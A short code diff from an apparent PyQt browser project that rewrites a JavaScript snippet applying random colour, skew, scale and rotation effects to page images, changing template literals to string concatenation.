             browser = self.tabs.widget(i).findChild(QWebEngineView)
             browser.page().runJavaScript("""
                 document.querySelectorAll('img').forEach(img => {
-                    img.style.filter = `hue-rotate(${Math.random() * 360}deg) saturate(${Math.random() * 1.5 + 0.5}) skew(${Math.random() * 20 - 10}deg, ${Math.random() * 20 - 10}deg)`;
-                    img.style.transform = `scale(${Math.random() * 0.5 + 0.75}) rotate(${Math.random() * 20 - 10}deg)`;
+                    img.style.filter = 'hue-rotate(' + (Math.random() * 360) + 'deg) saturate(' + (Math.random() * 1.5 + 0.5) + ') skew(' + (Math.random() * 20 - 10) + 'deg, ' + (Math.random() * 20 - 10) + 'deg)';
+                    img.style.transform = 'scale(' + (Math.random() * 0.5 + 0.75) + ') rotate(' + (Math.random() * 20 - 10) + 'deg)';
                 });
             """)
 
